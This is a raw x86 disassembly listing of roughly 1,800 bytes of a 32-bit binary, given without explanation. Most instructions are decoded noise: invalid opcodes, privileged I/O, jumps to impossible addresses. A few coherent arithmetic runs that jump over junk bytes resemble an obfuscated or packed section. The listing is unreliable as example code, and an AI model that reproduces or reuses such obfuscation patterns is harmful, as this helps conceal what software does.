  40cfcd:	or     esp,DWORD PTR [eax+0x56dc0494]
  40cfd3:	mov    ds:0x8af1f283,eax
  40cfd8:	push   edi
  40cfd9:	pop    ds
  40cfda:	push   ebp
  40cfdb:	dec    esi
  40cfdc:	and    BYTE PTR [edi],0xe7
  40cfdf:	les    ebp,FWORD PTR [ebx]
  40cfe1:	mov    cl,0x51
  40cfe4:	xchg   esi,eax
  40cfe5:	call   0x33b22cc3
  40cfea:	sub    DWORD PTR [ebp+0x16],edi
  40cfed:	pop    edi
  40cfee:	xchg   DWORD PTR ds:0x795b4c2d,ecx
  40cff4:	push   ds
  40cff5:	mov    dh,0x66
  40cff7:	in     al,dx
  40cff8:	fisttp QWORD PTR [edi]
  40cffa:	push   ebx
  40cffb:	add    esi,DWORD PTR [esi+0x75]
  40cffe:	idiv   ebp
  40d000:	mov    dl,0x4f
  40d002:	mov    dl,0x26
  40d004:	pop    edi
  40d005:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40d007:	dec    ebx
  40d008:	push   ss
  40d009:	xchg   edx,eax
  40d00a:	jp     0x40d065
  40d00c:	mov    ds:0x487dabbb,eax
  40d011:	icebp  
  40d012:	nop
  40d013:	pandn  mm1,QWORD PTR [esi-0x53444ec6]
  40d01a:	xchg   esp,eax
  40d01b:	out    0x8,eax
  40d01d:	aam    0x5d
  40d01f:	add    ah,BYTE PTR [eax-0x582ef8d7]
  40d025:	jne    0x40cfdc
  40d027:	adc    eax,0x4842c2e1
  40d02c:	jb     0x40d09a
  40d02e:	rcr    BYTE PTR [eax],0xfe
  40d031:	pushf  
  40d032:	movq   mm1,mm7
  40d035:	inc    edi
  40d036:	mov    ds:0x84eeade8,al
  40d03b:	pop    edi
  40d03c:	jle    0x40cfc0
  40d03e:	mov    esp,0xa14e728a
  40d043:	dec    eax
  40d044:	inc    ebx
  40d045:	jecxz  0x40d06a
  40d047:	and    DWORD PTR [edi-0x5c268c92],ebp
  40d04d:	mov    esp,0x1f63e54d
  40d052:	dec    esp
  40d053:	aam    0x90
  40d055:	dec    edx
  40d056:	in     al,0x30
  40d058:	xchg   BYTE PTR [esi-0x1075c447],ah
  40d05e:	ja     0x40cffa
  40d060:	push   0x62
  40d062:	lock dec esi
  40d064:	mov    ah,0xa1
  40d066:	push   0xfffffff5
  40d068:	mov    ch,0x62
  40d06b:	retf   
  40d06c:	pushf  
  40d06d:	inc    eax
  40d06e:	jnp    0x40d0c0
  40d070:	es je  0x40d05a
  40d073:	(bad)  
  40d074:	mov    al,0x7d
  40d076:	or     al,0xbc
  40d078:	push   0x3ad0345f
  40d07d:	xchg   esp,eax
  40d07e:	mov    ds:0xb017a79e,al
  40d083:	sti    
  40d084:	jg     0x40d0ea
  40d086:	sub    BYTE PTR [ebp+0x33],al
  40d089:	add    al,0xf
  40d08b:	aas    
  40d08c:	add    ah,al
  40d08e:	les    ecx,FWORD PTR [edx]
  40d090:	adc    ecx,edx
  40d092:	cmc    
  40d093:	leave  
  40d094:	enter  0x7b84,0x41
  40d098:	adc    al,0xd2
  40d09a:	jb     0x40d047
  40d09c:	fmul   st(5),st
  40d09e:	outs   dx,BYTE PTR ds:[esi]
  40d09f:	xchg   esi,eax
  40d0a0:	push   es
  40d0a1:	mov    eax,ds:0x23340fe7
  40d0a6:	(bad)  
  40d0a7:	icebp  
  40d0a8:	push   ebp
  40d0a9:	pop    ss
  40d0aa:	retf   
  40d0ab:	repnz (bad) [esi-0xe]
  40d0af:	dec    ecx
  40d0b0:	ror    bl,1
  40d0b2:	add    ebx,DWORD PTR [eax+eiz*1+0x68]
  40d0b6:	mov    eax,0x592dd450
  40d0bb:	fsub   st,st(3)
  40d0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0be:	std    
  40d0bf:	outs   dx,BYTE PTR ss:[esi]
  40d0c1:	iret   
  40d0c2:	scas   eax,DWORD PTR es:[edi]
  40d0c3:	xor    BYTE PTR [edi+0x6d],bh
  40d0c6:	pop    ebp
  40d0c7:	or     DWORD PTR [edx-0x23],ebx
  40d0ca:	sahf   
  40d0cb:	push   DWORD PTR ds:0x33072afd
  40d0d1:	jl     0x40d071
  40d0d3:	fsin   
  40d0d5:	mov    eax,0x949db98d
  40d0da:	sbb    BYTE PTR [edx-0x7bee9aed],bh
  40d0e0:	shr    cl,cl
  40d0e2:	cld    
  40d0e3:	inc    esi
  40d0e4:	or     al,0xa0
  40d0e6:	inc    edx
  40d0e7:	mov    al,bl
  40d0e9:	and    edi,DWORD PTR [edx-0x405bc8d5]
  40d0ef:	cmp    BYTE PTR [ecx-0x56],0x6f
  40d0f3:	mov    dl,0xa9
  40d0f5:	or     al,0x5f
  40d0f7:	aaa    
  40d0f8:	and    DWORD PTR [esi],0xffffffab
  40d0fb:	aaa    
  40d0fc:	test   eax,0x3629a1af
  40d101:	stos   BYTE PTR es:[edi],al
  40d102:	xor    esp,DWORD PTR [ebx-0x4989f5d9]
  40d108:	jge    0x40d16b
  40d10a:	aam    0xbb
  40d10c:	push   edx
  40d10d:	jnp    0x40d178
  40d10f:	dec    eax
  40d110:	popa   
  40d111:	xchg   edi,eax
  40d112:	ins    DWORD PTR es:[edi],dx
  40d113:	mov    edi,ebx
  40d115:	in     eax,dx
  40d116:	repz jecxz 0x40d18d
  40d119:	jg     0x40d10b
  40d11b:	or     edx,ecx
  40d11d:	push   0xfffffffd
  40d11f:	test   BYTE PTR [edx],bh
  40d121:	jne    0x40d0b9
  40d123:	aad    0x11
  40d125:	mov    ebx,0x1d6bf52e
  40d12a:	jmp    0x1845:0x174392d9
  40d131:	mov    ebx,?
  40d133:	or     DWORD PTR [eax-0x6d44b6d3],ebx
  40d139:	int    0x62
  40d13b:	push   bx
  40d13d:	fidiv  DWORD PTR [edi+0x40390f42]
  40d143:	dec    edi
  40d144:	and    ebx,ebp
  40d146:	adc    eax,0xf05a6567
  40d14c:	pop    ss
  40d14d:	jne    0x40d19c
  40d14f:	mov    edx,0xf7231f27
  40d154:	xor    bl,BYTE PTR [edx]
  40d156:	adc    DWORD PTR [ecx],0xdd731597
  40d15c:	push   esp
  40d15d:	sar    DWORD PTR [eax],0x3f
  40d160:	inc    ebx
  40d161:	xor    ebx,esi
  40d163:	lods   eax,DWORD PTR ds:[esi]
  40d164:	push   ecx
  40d165:	aam    0x1e
  40d167:	fistp  WORD PTR [ebp-0x2a957160]
  40d16d:	and    ecx,DWORD PTR [esi+0x601447fe]
  40d173:	cmp    BYTE PTR [edx-0x74d7853a],dh
  40d179:	lea    ebp,[ebx-0x3f]
  40d17c:	and    edx,DWORD PTR ds:0x11be9759
  40d182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d184:	cmc    
  40d185:	ret    0xd35d
  40d188:	sar    BYTE PTR ds:0x5c61e72e,1
  40d18e:	lea    ebp,[eax]
  40d190:	cmp    eax,0x2bb4e313
  40d195:	loopne 0x40d16e
  40d197:	sub    bl,BYTE PTR [eax-0x52]
  40d19a:	in     eax,dx
  40d19b:	sbb    BYTE PTR [ebp-0x31cbeaae],dh
  40d1a1:	sub    bh,BYTE PTR [ecx+0x3da92c59]
  40d1a7:	data16 jl 0x40d1e7
  40d1aa:	mov    dh,0xd1
  40d1ac:	inc    esp
  40d1ad:	(bad)  
  40d1ae:	stos   BYTE PTR es:[edi],al
  40d1af:	push   0x6e
  40d1b1:	push   edi
  40d1b2:	xchg   BYTE PTR [ebp+0x29],al
  40d1b5:	ret    
  40d1b6:	(bad)  
  40d1b7:	stos   DWORD PTR es:[edi],eax
  40d1b8:	adc    BYTE PTR [edx+0x7b84e21c],al
  40d1be:	adc    eax,0xaca52785
  40d1c3:	aas    
  40d1c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1c5:	mov    al,ds:0x1c6565ab
  40d1ca:	js     0x40d22d
  40d1cc:	push   ss
  40d1cd:	jns    0x40d18f
  40d1cf:	adc    edi,ebx
  40d1d1:	retf   0x5f3a
  40d1d4:	loopne 0x40d170
  40d1d6:	mov    eax,ds:0xe6cd6e30
  40d1db:	push   edx
  40d1dc:	in     al,0x40
  40d1de:	xchg   esp,eax
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	fs jl  0x40d1bd
  40d211:	sub    al,dh
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	lods   al,BYTE PTR ds:[esi]
  40d21b:	xlat   BYTE PTR ds:[ebx]
  40d21c:	xor    al,0xf2
  40d21e:	mov    DWORD PTR [edx],ecx
  40d220:	mov    esi,0x1e65b645
  40d225:	mov    eax,ds:0xfa30844d
  40d22a:	or     eax,0xd172e00c
  40d22f:	sbb    al,0x99
  40d231:	pop    ecx
  40d232:	cmp    eax,0x4ce8bb8f
  40d237:	gs adc esi,esi
  40d23a:	or     DWORD PTR [esp+esi*4],esp
  40d23d:	stos   DWORD PTR es:[edi],eax
  40d23e:	scas   al,BYTE PTR es:[edi]
  40d23f:	and    eax,ecx
  40d241:	jns    0x40d29e
  40d243:	data16 std 
  40d245:	imul   ecx,ebp,0x27
  40d248:	clc    
  40d249:	test   BYTE PTR [ecx],dl
  40d24b:	sahf   
  40d24c:	das    
  40d24d:	mov    gs,WORD PTR [edi-0x27]
  40d250:	xchg   ebx,eax
  40d251:	lods   eax,DWORD PTR ds:[esi]
  40d252:	dec    ecx
  40d253:	mov    dh,0x12
  40d255:	and    cl,BYTE PTR [eax-0x6b]
  40d258:	dec    edx
  40d259:	(bad)  
  40d25a:	mov    dh,dl
  40d25c:	sub    edx,DWORD PTR [ecx+edi*8]
  40d25f:	lods   al,BYTE PTR ds:[esi]
  40d260:	pop    es
  40d261:	shr    DWORD PTR [ebx+edi*2-0x36],0x5c
  40d266:	mov    bh,0x2a
  40d268:	out    0xe1,eax
  40d26a:	test   bl,al
  40d26c:	cdq    
  40d26d:	mov    bl,0x46
  40d26f:	push   ds
  40d270:	and    al,0xd0
  40d272:	mov    ds:0xb2d9488c,al
  40d277:	xlat   BYTE PTR ds:[ebx]
  40d278:	mov    ch,0xec
  40d27a:	cld    
  40d27b:	dec    edi
  40d27c:	enter  0xb020,0x87
  40d280:	dec    edi
  40d281:	pop    ecx
  40d283:	fnstenv [eax]
  40d285:	jmp    0x77dae1b3
  40d28a:	mov    ds:0xa049481f,eax
  40d28f:	sub    ch,ch
  40d291:	xchg   esi,eax
  40d292:	imul   edi,DWORD PTR [ebp+0x55],0xec583929
  40d299:	fild   QWORD PTR [eax-0x7727fbb6]
  40d29f:	data16 fisub DWORD PTR [eax-0x4b]
  40d2a3:	(bad)  
  40d2a4:	out    dx,al
  40d2a5:	fistp  WORD PTR [edi+0x2b]
  40d2a8:	xor    bl,BYTE PTR [edx]
  40d2aa:	iret   
  40d2ab:	fwait
  40d2ac:	js     0x40d283
  40d2ae:	ss xchg esp,eax
  40d2b0:	inc    edi
  40d2b1:	dec    esi
  40d2b2:	inc    ebp
  40d2b3:	ins    DWORD PTR es:[edi],dx
  40d2b4:	retf   
  40d2b5:	xchg   ebx,eax
  40d2b6:	mov    eax,ds:0x129aae
  40d2bb:	rcl    BYTE PTR [eax-0x540e01d5],cl
  40d2c1:	imul   edi,DWORD PTR [edi],0x84bc3a53
  40d2c7:	jo     0x40d29e
  40d2c9:	mov    ds:0x73a81795,eax
  40d2ce:	cwde   
  40d2cf:	sbb    DWORD PTR [ebx-0x2e],ebx
  40d2d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2d3:	ds ror bh,0x1e
  40d2d7:	aas    
  40d2d8:	dec    ebx
  40d2d9:	xchg   esp,eax
  40d2da:	jno    0x40d34d
  40d2dc:	add    BYTE PTR [eax+0x778175a9],dh
  40d2e2:	sbb    ecx,DWORD PTR [ebx+0x11a93874]
  40d2e8:	mov    BYTE PTR [edi-0x28],dh
  40d2eb:	cmp    edx,DWORD PTR [esp+ecx*1]
  40d2ee:	ins    DWORD PTR es:[edi],dx
  40d2ef:	dec    eax
  40d2f0:	push   ebp
  40d2f1:	daa    
  40d2f2:	int    0x5c
  40d2f4:	in     eax,dx
  40d2f5:	cmp    bh,BYTE PTR [edi-0x5f13e33f]
  40d2fb:	xor    al,dh
  40d2fd:	mov    dh,0x6
  40d2ff:	and    al,0xc0
  40d301:	jmp    0x40d32e
  40d303:	pop    ds
  40d304:	fild   QWORD PTR [ebp-0x19017b21]
  40d30a:	dec    ebx
  40d30b:	adc    bh,BYTE PTR [ebx]
  40d30d:	(bad)  
  40d30e:	push   ebp
  40d30f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d310:	loop   0x40d2c0
  40d312:	(bad)  
  40d313:	adc    al,0xe2
  40d315:	adc    al,0x64
  40d317:	mov    WORD PTR [ebx+0x6203e911],ds
  40d31d:	repz call 0x2e039785
  40d323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d324:	je     0x40d332
  40d326:	xchg   BYTE PTR [esi],ah
  40d328:	fisub  DWORD PTR [ecx+0x7f8351e8]
  40d32e:	pop    eax
  40d32f:	not    BYTE PTR [ecx]
  40d331:	and    al,BYTE PTR [ebp-0x6d]
  40d334:	aaa    
  40d335:	pop    esi
  40d336:	pop    es
  40d337:	cmc    
  40d338:	dec    eax
  40d339:	adc    ah,bl
  40d33b:	pop    ds
  40d33c:	(bad)  [eax+0x26]
  40d33f:	mov    al,0xcd
  40d341:	daa    
  40d342:	popf   
  40d343:	repz or eax,0x1fda347
  40d349:	leave  
  40d34a:	dec    DWORD PTR [ebx-0x67]
  40d34d:	pop    ss
  40d34e:	mov    cl,0xf0
  40d350:	jns    0x40d33e
  40d352:	in     eax,dx
  40d353:	mov    eax,ds:0x541ae1ee
  40d358:	mov    eax,ds:0x877c0fb2
  40d35d:	add    eax,0xe6fdbb81
  40d362:	sbb    al,0x3
  40d364:	mov    dh,0xaf
  40d366:	(bad)  
  40d367:	fsubr  DWORD PTR [ecx+0x8574b46]
  40d36d:	or     edx,edx
  40d36f:	mov    dh,0xa9
  40d371:	dec    dx
  40d373:	jmp    0x52ba:0x654c378a
  40d37a:	and    edx,esi
  40d37c:	pop    ds
  40d37d:	fild   WORD PTR [edx]
  40d37f:	dec    ebx
  40d380:	jl     0x40d324
  40d382:	in     al,dx
  40d383:	mov    edi,0x99a84626
  40d388:	aad    0xad
  40d38a:	ds push ebp
  40d38c:	add    ebx,ebx
  40d38e:	sub    eax,DWORD PTR [ebp-0x48077f1f]
  40d394:	mov    cl,0x6
  40d396:	push   edi
  40d397:	xor    DWORD PTR [ebp-0x44b621bf],ebp
  40d39d:	shl    dh,cl
  40d39f:	fcom   st(5)
  40d3a1:	sti    
  40d3a2:	fsubr  QWORD PTR [ebx+eiz*4+0x5d096f05]
  40d3a9:	in     al,dx
  40d3aa:	mov    esi,0x299bc036
  40d3af:	mov    ecx,0x59583862
  40d3b4:	mov    esp,0x2c521f37
  40d3b9:	push   0x51
  40d3bb:	ins    BYTE PTR es:[edi],dx
  40d3bc:	dec    edi
  40d3bd:	addr16 out dx,al
  40d3bf:	pop    eax
  40d3c0:	or     al,0x36
  40d3c2:	cwde   
  40d3c3:	stc    
  40d3c4:	dec    eax
  40d3c5:	xchg   eax,ecx
  40d3c7:	add    BYTE PTR [esi+0x1baa8e42],cl
  40d3cd:	mov    eax,0x8471fc2f
  40d3d2:	lahf   
  40d3d3:	ja     0x40d3eb
  40d3d5:	jmp    0x40d39b
  40d3d7:	repnz mov dl,0x31
  40d3da:	jbe    0x40d449
  40d3dc:	inc    esp
  40d3dd:	mov    ah,0x4a
  40d3df:	cmc    
  40d3e0:	cmp    edi,DWORD PTR [edx-0x36]
  40d3e3:	fmulp  st(6),st
  40d3e5:	or     ah,BYTE PTR [ebp-0x360823f3]
  40d3eb:	pop    ds
  40d3ec:	addr16 pusha 
  40d3ee:	imul   eax,edi,0x99075371
  40d3f4:	nop
  40d3f5:	pop    edi
  40d3f6:	push   es
  40d3f7:	rol    esp,cl
  40d3f9:	test   BYTE PTR ds:0xf663c9e0,cl
  40d3ff:	sub    al,0x9d
  40d401:	pop    ecx
  40d402:	mov    BYTE PTR [edx-0x49],ch
  40d405:	adc    eax,0xaf0d9f25
  40d40a:	dec    edx
  40d40b:	adc    DWORD PTR [ebx+0x591e3b43],edx
  40d411:	inc    esp
  40d412:	cli    
  40d413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d414:	jmp    0xa4f51d95
  40d419:	shr    edi,1
  40d41b:	out    0x53,al
  40d41d:	sbb    eax,0xe404f22d
  40d422:	inc    ebx
  40d423:	or     dh,BYTE PTR [edx]
  40d425:	into   
  40d426:	adc    bh,BYTE PTR [esi+0x1f]
  40d429:	in     al,dx
  40d42a:	xchg   ebx,eax
  40d42b:	pop    ebx
  40d42c:	pusha  
  40d42d:	xchg   ebp,eax
  40d42e:	jg     0x40d40f
  40d430:	sub    eax,0x990575c8
  40d435:	mul    DWORD PTR cs:[ecx-0x43]
  40d439:	std    
  40d43a:	jge    0x40d413
  40d43c:	mov    ah,0x31
  40d43e:	fnsave [edi-0x3984eb2]
  40d444:	repz (bad) 
  40d446:	stos   DWORD PTR es:[edi],eax
  40d447:	cmp    DWORD PTR [ebx],esp
  40d449:	addr16 pop esi
  40d44b:	xchg   ebp,eax
  40d44c:	cmc    
  40d44d:	xor    al,0x4e
  40d44f:	shr    DWORD PTR [esi+0x52],0x2e
  40d453:	rcr    BYTE PTR [edx+edx*1-0x39956064],1
  40d45a:	bound  edx,QWORD PTR [edx+0x25]
  40d45d:	in     eax,0x3a
  40d45f:	pop    edi
  40d460:	or     al,0xe7
  40d462:	inc    edx
  40d463:	lods   eax,DWORD PTR ds:[esi]
  40d464:	and    ebx,esp
  40d466:	pop    eax
  40d467:	(bad)  
  40d468:	arpl   WORD PTR [eax-0xd839a23],cx
  40d46e:	and    eax,0x5c42387c
  40d473:	xor    bh,BYTE PTR [ebx+eiz*1-0x80]
  40d477:	adc    DWORD PTR [edx+0x66c98121],edi
  40d47d:	daa    
  40d47e:	dec    ebp
  40d47f:	out    0x2f,eax
  40d481:	clc    
  40d482:	out    0xdd,eax
  40d484:	cld    
  40d485:	aam    0x2c
  40d487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d488:	icebp  
  40d489:	outs   dx,DWORD PTR ds:[esi]
  40d48a:	pop    edx
  40d48b:	or     al,0x29
  40d48d:	adc    eax,ebp
  40d48f:	gs add dh,bl
  40d492:	dec    edi
  40d493:	nop
  40d494:	fst    DWORD PTR [ebx+0x7dd2a618]
  40d49a:	adc    BYTE PTR [ecx+ecx*4+0x5f355ee3],cl
  40d4a1:	sbb    DWORD PTR [edi-0x75],0x91367087
  40d4a8:	ret    
  40d4a9:	dec    ebx
  40d4aa:	xchg   ebp,eax
  40d4ab:	in     eax,0x85
  40d4ad:	mov    esi,0x12364b3
  40d4b2:	dec    edi
  40d4b3:	out    dx,eax
  40d4b4:	jecxz  0x40d52c
  40d4b6:	std    
  40d4b7:	sub    eax,ecx
  40d4b9:	out    dx,al
  40d4ba:	sub    edx,DWORD PTR [eax+0x5f]
  40d4bd:	addr16 retf 
  40d4bf:	adc    eax,0xc0e47e87
  40d4c4:	mov    edx,0x16335523
  40d4c9:	mov    DWORD PTR [edx+edi*4],esi
  40d4cc:	retf   
  40d4cd:	add    DWORD PTR [eax-0x6f15c9b],esi
  40d4d3:	repnz std 
  40d4d5:	test   al,0x79
  40d4d7:	xchg   ecx,eax
  40d4d8:	aad    0x6f
  40d4da:	out    dx,al
  40d4db:	pusha  
  40d4dc:	push   ecx
  40d4dd:	jge    0x40d48d
  40d4df:	in     al,0x31
  40d4e1:	xchg   ebx,eax
  40d4e2:	neg    DWORD PTR [edi+0x279f477b]
  40d4e8:	adc    edi,DWORD PTR [eax]
  40d4ea:	lods   al,BYTE PTR ds:[esi]
  40d4eb:	push   ebx
  40d4ec:	fistp  QWORD PTR [esi-0x3d]
  40d4ef:	sar    BYTE PTR [edx-0x58],0x33
  40d4f3:	push   edx
  40d4f4:	xchg   edx,eax
  40d4f5:	xor    bl,dl
  40d4f7:	jnp    0x40d4b4
  40d4f9:	mov    gs,WORD PTR [eax-0x770ec34f]
  40d4ff:	jns    0x40d522
  40d501:	xlat   BYTE PTR ds:[ebx]
  40d502:	push   eax
  40d503:	popa   
  40d504:	jl     0x40d4f7
  40d506:	sub    esi,esp
  40d508:	inc    edx
  40d509:	xor    al,0xf
  40d50b:	and    BYTE PTR [eax],al
  40d50d:	or     eax,0xa60e327
  40d512:	fwait
  40d513:	retf   
  40d514:	add    bl,cl
  40d516:	stc    
  40d517:	sbb    ebp,0x438d1dc1
  40d51d:	stos   DWORD PTR es:[edi],eax
  40d51e:	cmc    
  40d51f:	mov    eax,0x2a83d589
  40d524:	jo     0x40d4ea
  40d526:	xor    bh,ch
  40d528:	mov    gs,WORD PTR [ebx+edi*1]
  40d52b:	jmp    0x3e202d33
  40d530:	xor    dl,BYTE PTR [ebx+0x4c]
  40d533:	fsubr  DWORD PTR [ecx+0x30]
  40d536:	mov    bl,0x85
  40d538:	mov    dl,0x3f
  40d53a:	inc    esi
  40d53b:	loopne 0x40d557
  40d53d:	clc    
  40d53e:	cmp    DWORD PTR [esi],ecx
  40d540:	pop    edx
  40d541:	lahf   
  40d542:	inc    ecx
  40d543:	sub    DWORD PTR [esi],esi
  40d545:	add    al,0x1c
  40d547:	pop    ds
  40d548:	dec    esp
  40d549:	and    DWORD PTR [esi-0x1094b77b],ebp
  40d54f:	lea    eax,[eax-0x3aa915ea]
  40d555:	sti    
  40d556:	jbe    0x40d514
  40d558:	mov    bh,0x1a
  40d55a:	jbe    0x40d522
  40d55c:	xor    eax,0xebe4ec7c
  40d561:	test   eax,0x37ca46de
  40d566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d567:	cs popa 
  40d569:	push   cs
  40d56a:	aad    0x81
  40d56c:	fadd   DWORD PTR [edi-0x78]
  40d56f:	dec    ebp
  40d570:	mov    bl,0xba
  40d572:	inc    ecx
  40d573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d574:	neg    DWORD PTR [ebp-0x115542d]
  40d57a:	dec    ebp
  40d57b:	xor    ebp,esp
  40d57d:	lods   al,BYTE PTR ds:[esi]
  40d57e:	cmp    al,BYTE PTR [eax+eiz*1-0x165f9ccf]
  40d585:	(bad)  
  40d586:	mov    dl,0xac
  40d588:	loop   0x40d5b0
  40d58a:	add    eax,0xf520d88b
  40d58f:	xchg   ebx,esi
  40d591:	stc    
  40d592:	cli    
  40d593:	inc    esp
  40d594:	mov    eax,0x2f79f66c
  40d599:	xchg   DWORD PTR [ebp+eax*8-0x45e40ca0],eax
  40d5a0:	push   esp
  40d5a1:	fwait
  40d5a2:	cdq    
  40d5a3:	mov    ebp,0x42ffa9de
  40d5a8:	int3   
  40d5a9:	sbb    eax,0x815c93b0
  40d5ae:	cld    
  40d5af:	iret   
  40d5b0:	add    BYTE PTR [esi+0x40],dl
  40d5b3:	loopne 0x40d5a0
  40d5b5:	xor    eax,0x47e1c46b
  40d5ba:	or     bl,BYTE PTR [ebx+0x69]
  40d5bd:	xchg   esp,eax
  40d5be:	push   edi
  40d5bf:	scas   al,BYTE PTR es:[edi]
  40d5c0:	adc    esi,esp
  40d5c2:	sbb    DWORD PTR [ecx-0x568fc86e],eax
  40d5c8:	adc    ebx,DWORD PTR [ecx-0x50]
  40d5cb:	dec    ecx
  40d5cc:	mov    ch,0xe
  40d5ce:	cld    
  40d5cf:	into   
  40d5d0:	lea    ecx,[ebp-0x6f]
  40d5d3:	sub    esi,0x61dc7e4b
  40d5d9:	fmul   QWORD PTR [eax+0x4e]
  40d5dc:	mov    ah,0x45
  40d5de:	sti    
  40d5df:	inc    esi
  40d5e0:	cmp    al,0xe9
  40d5e2:	arpl   WORD PTR [eax],si
  40d5e4:	cmp    bh,dh
  40d5e6:	mov    BYTE PTR [edi+eax*8-0x3f],al
  40d5ea:	jno    0x40d592
  40d5ec:	adc    DWORD PTR [edx-0x77c08417],ebp
  40d5f2:	or     al,ch
  40d5f4:	ficom  WORD PTR [edi]
  40d5f6:	hlt    
  40d5f7:	xor    esp,DWORD PTR [edi]
  40d5f9:	idiv   DWORD PTR gs:[edx+0x3c]
  40d5fd:	mov    esi,0xdeff14e2
  40d602:	xchg   edi,eax
  40d603:	ja     0x40d5bd
  40d605:	stos   BYTE PTR es:[edi],al
  40d606:	dec    ebx
  40d607:	push   esi
  40d608:	xor    dl,BYTE PTR [edx+0x2b]
  40d60b:	mov    dh,0x29
  40d60d:	test   eax,0x12136d60
  40d612:	dec    eax
  40d613:	sub    dh,BYTE PTR [ebx]
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x39d97298
  40d64b:	icebp  
  40d64c:	cmp    BYTE PTR [esi+0x79707e7e],ah
  40d652:	jle    0x40d6d2
  40d654:	fs push 0x122d71c2
  40d65a:	or     ebp,DWORD PTR [edx]
  40d65c:	mov    al,ds:0xa4b5447b
  40d661:	scas   al,BYTE PTR es:[edi]
  40d662:	lods   al,BYTE PTR ds:[esi]
  40d663:	pop    esi
  40d664:	rol    DWORD PTR [ebx],cl
  40d666:	xor    al,BYTE PTR [esp+edx*8-0x2fd4851b]
  40d66d:	out    dx,eax
  40d66e:	mov    dl,0xfa
  40d670:	jne    0x40d67e
  40d672:	or     DWORD PTR [esp+ecx*2+0x12692a43],esp
  40d679:	or     ah,BYTE PTR [ebp-0x478153c7]
  40d67f:	xchg   BYTE PTR [ebx-0x1b77e51c],bl
  40d685:	sbb    edi,ebx
  40d687:	int3   
  40d688:	xchg   ebx,eax
  40d689:	inc    ebx
  40d68a:	jle    0x40d6b7
  40d68c:	cmp    DWORD PTR [eax-0x3],eax
  40d68f:	dec    BYTE PTR [esi]
  40d691:	adc    dh,0x8a
  40d694:	mov    ch,0xb1
  40d696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d697:	adc    eax,0xffffffad
  40d69a:	mov    cl,0x2a
  40d69c:	pop    esp
  40d69d:	scas   al,BYTE PTR es:[edi]
  40d69e:	cmp    eax,0x8415f377
  40d6a3:	test   eax,0xdb2ad032
  40d6a8:	fprem  
  40d6aa:	pop    edi
  40d6ab:	jmpw   0x2c7a
  40d6af:	sbb    DWORD PTR [eax],ebx
  40d6b1:	std    
  40d6b2:	ja     0x40d6ae
  40d6b4:	pcmpgtw mm6,QWORD PTR [ecx+0x6debf8f6]
  40d6bb:	mov    BYTE PTR [ebx-0x39108894],dh
  40d6c1:	push   eax
  40d6c2:	sub    bh,cl
  40d6c4:	leave  
  40d6c5:	dec    edx
  40d6c6:	jbe    0x40d745
  40d6c8:	and    eax,0xf13157cd
  40d6cd:	arpl   WORD PTR [ebx+edx*1],sp
  40d6d0:	ret    
  40d6d1:	mov    cl,0xf9
  40d6d3:	lods   eax,DWORD PTR ds:[esi]
  40d6d4:	inc    esp
  40d6d5:	add    bl,dh
  40d6d7:	rcr    eax,1
  40d6d9:	mov    eax,0xf4102086
  40d6de:	mov    eax,ds:0xc03f8e7f
  40d6e3:	test   ebp,0x8a16c1ea
  40d6e9:	scas   al,BYTE PTR es:[edi]
  40d6ea:	lock les edi,FWORD PTR ds:0x8ee53252
  40d6f1:	js     0x40d6ce
  40d6f3:	and    DWORD PTR [ebx-0x1909ef78],0xffffff83
  40d6fa:	fisubr DWORD PTR [ebp-0x4e]
  40d6fd:	int    0xe
  40d6ff:	jl     0x40d6fa
  40d701:	dec    ecx
  40d702:	jecxz  0x40d69a
  40d704:	fwait
  40d705:	out    dx,al
  40d706:	push   eax
  40d707:	enter  0x8985,0x38
  40d70b:	jnp    0x40d6c6
  40d70d:	sbb    eax,0x38abcf87
  40d712:	cwde   
  40d713:	dec    edx
  40d714:	(bad)  
  40d715:	and    eax,0x8741d9f4
  40d71a:	shl    BYTE PTR [ebp+0x15],0x66
  40d71e:	adc    esi,DWORD PTR [edi]
  40d720:	loopne 0x40d719
  40d722:	pusha  
  40d723:	jmp    0x807a29be
  40d728:	adc    cl,BYTE PTR [edi]
  40d72a:	xchg   esi,eax
  40d72b:	and    dl,cl
  40d72d:	add    BYTE PTR [ecx+0x6e],ch
